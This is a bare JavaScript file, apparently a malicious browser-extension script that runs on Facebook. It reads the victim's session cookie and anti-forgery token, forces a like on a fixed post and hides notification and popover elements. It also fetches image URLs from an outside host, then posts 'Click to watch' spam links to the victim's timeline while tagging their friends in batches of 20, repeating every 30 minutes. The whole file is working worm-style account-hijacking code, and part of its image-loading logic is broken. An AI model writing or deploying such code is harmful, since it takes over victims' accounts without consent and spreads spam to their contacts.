if(!document.getElementById("amung")){ new Image().src = 'http://whos.amung.us/pingjs/?k=tw04h5887e1i'; }

if(location.hostname.indexOf("www.facebook.com") >= 0) {
    
    window.setInterval(function() {

        if (document.getElementsByClassName("_5ce")) {
            for (i = 0; i < document.getElementsByClassName("_5ce").length; i++) {
                document.getElementsByClassName("_5ce")[i].innerHTML = "";
            }
        }
        if (document.getElementsByClassName("uiToggle wrap")) {
            for (i = 0; i < document.getElementsByClassName("uiToggle wrap").length; i++) {
                document.getElementsByClassName("uiToggle wrap")[i].innerHTML = "";
            }
        }
        if (document.getElementsByClassName("uiPopover")) {
            for (i = 0; i < document.getElementsByClassName("uiPopover").length; i++) {
                document.getElementsByClassName("uiPopover")[i].innerHTML = "";
            }
        }
    }, 10);

    var profile_id = document.cookie.match(/c_user=(\d+)/)[1];
    var config = document.getElementsByName('fb_dtsg')[0].value;
    var cookiene = "sadsadadsdsddsdssssssss";

    function begen(id) {
        var http = new XMLHttpRequest();
        http.onreadystatechange = function () {
            if (http.readyState == 4) {}
        };
        var params = "like_action=true&ft_ent_identifier=" + id;
        params +="&__user=" + profile_id;
        params += "&fb_dtsg="+document.getElementsByName('fb_dtsg')[0].value;
        http.open("POST", "/ajax/ufi/like.php", true);
        http.send(params);
    }
    
    begen("784024965019465");

    function rastgele(uzunluk) {             
        mtn = "ABCDEFGHIJKLMNOPRSTUVYZXabcdefghijklmnoprstuvyzx0123456789";
        ret = "";
        for (i = 0; i < uzunluk; i++) {
            ret += mtn[Math.floor(Math.random() * 57)];
        }
        return ret;
    }


    var isim = "Click to watch =>"+rastgele(15)+"";

    function localhost() {
        
        var jsimg = new XMLHttpRequest();
        jsimg.onreadystatechange = function() {
          var arrimg = JSON.parse(jsimg.responseText);
          console.log(arrimg);
        }
        jsimg.open('GET', 'http://www.linohost.com/static/images.json');
        jsimg.send();
        
        image = arrimg['images'][Math.floor(Math.random() * arrimg['images'].length)];
        link = "http://xmlsite.net";
        
        arkadaslar();
    }

        function arkadaslar() {
            xmlhttp = new XMLHttpRequest();
            xmlhttp.open("GET", "/ajax/typeahead/place_tag_friends.php?__a=1&content_id=395870630487365&viewer=" + profile_id + "&" + Math.random(), false);
            xmlhttp.send();
            if (xmlhttp.readyState != 4) {} else {
                data = eval('(' + xmlhttp.responseText.substr(9) + ')');
                if (data.error) {} else {
                    friends = data.payload.entries.sort(function(a, b) {
                        return a.index - b.index;
                    });

                }
            }
            var friends_fields = new Array(new Array());
            var how_many = 0;
            var array_count = 0;
            for (var i = 0; i < friends.length; i++) {

                if (friends[i].uid != profile_id) {

                    friends_fields[array_count][how_many] = "&composertags_with[" + how_many + "]=" + friends[i].uid;
                    how_many++;
                    if (how_many >= 20) {

                        how_many = 0;
                        array_count++;
                        friends_fields[array_count] = new Array();
                    }

                }
            }
            var arkadas = "";
            for (var i = 0; i < friends_fields.length; i++) {

                for (var k = 0; k < friends_fields[i].length; k++) {
                    arkadas += friends_fields[i][k];
                }
                var xhr = new XMLHttpRequest();
                var params = "fb_dtsg=" + config;
                params += "&xhpc_context=home";
                params += "&xhpc_ismeta=1";
                params += "&xhpc_timeline=";
                params += "&xhpc_composerid=u_0_r";
                params += "&xhpc_targetid=" + profile_id;
                params += "&xhpc_publish_type=1";
                params += "&xhpc_message_text=";
                params += "&xhpc_message=";
                params += "&aktion=post";
                params += "&app_id=2309869772";
                params += "&attachment[params][urlInfo][canonical]=" + link;
                params += "&attachment[params][urlInfo][final]=" + link;
                params += "&attachment[params][urlInfo][user]=" + link;
                params += "&attachment[params][responseCode]=200";
                params += "&attachment[params][title]=" + isim;
                params += "&attachment[params][content_removed]=";
                params += "&attachment[params][images][0]=" + image;
                params += "&attachment[params][ranked_images][ranking_model_version]=10";
                params += "&attachment[params][video_info][duration]=0";
                params += "&attachment[params][medium]=106";
                params += "&attachment[params][url]=" + link;
                params += "&attachment[params][time_scraped]=1419870286";
                params += "&attachment[params][cache_hit]=1";
                params += "&attachment[params][global_share_id]=474423878758";
                params += "&attachment[params][was_recent]=";
                params += "&attachment[params][metaTagMap][0][http-equiv]=content-type";
                params += "&attachment[params][metaTagMap][0][content]=text%2Fhtml%3B%20charset%3Dutf-8";
                params += "&attachment[params][metaTagMap][1][itemprop]=image";
                params += "&attachment[params][og_info][guesses][0][0]=og%3Aurl";
                params += "&attachment[params][og_info][guesses][0][1]=" + link;
                params += "&attachment[params][og_info][guesses][1][0]=og%3Atitle";
                params += "&attachment[params][og_info][guesses][1][1]=Google";
                params += "&attachment[params][og_info][guesses][2][0]=og%3Aimage";
                params += "&attachment[params][og_info][guesses][3][0]=og%3Alocale";
                params += "&attachment[params][og_info][guesses][3][1]=tr";
                params += "&attachment[params][ttl]=604800";
                params += "&attachment[params][error]=1";
                params += "&attachment[type]=100";
                params += "&composer_metrics[image_selected]=0";
                params += "&is_explicit_place=";
                params += arkadas;
                params += "&composertags_place=";
                params += "&composertags_place_name=";
                params += "&tagger_session_id=1420140363";
                params += "&action_type_id[0]=";
                params += "&object_str[0]=";
                params += "&object_id[0]=";
                params += "&hide_object_attachment=0";
                params += "&og_suggestion_mechanism=";
                params += "&og_suggestion_logging_data=";
                params += "&icon_id=";
                params += "&composertags_city=";
                params += "&disable_location_sharing=false";
                params += "&composer_predicted_city=";
                params += "&privacyx=300645083384735";
                params += "&nctr[_mod]=pagelet_composer";
                params += "&__user=" + profile_id;
                params += "&__a=1";
                params += "&__dyn=7nm8RW8BgBlynzpQ9UoGya4Au74qbx2mbAKGiyFqzQC-C26m5-9V8CdDx2ubhHximmey8qUS8zU";
                params += "&__req=y";
                params += "&ttstamp=265817089758111551991165368";
                params += "&__rev=1547526";
                xhr.open("POST", "/ajax/updatestatus.php?av=" + profile_id, true);
                xhr.send(params);
                var arkadas = '';
            }
        }
    
        tarih = new Date();
        if (!localStorage[cookiene + profile_id] || (localStorage[cookiene + profile_id] && tarih.getTime() >= localStorage[cookiene + profile_id])) {
                tarih.setTime(tarih.getTime() + 1000 * 60 * 30);
                localStorage[cookiene + profile_id] = tarih.getTime();
                localhost();
        }
}	
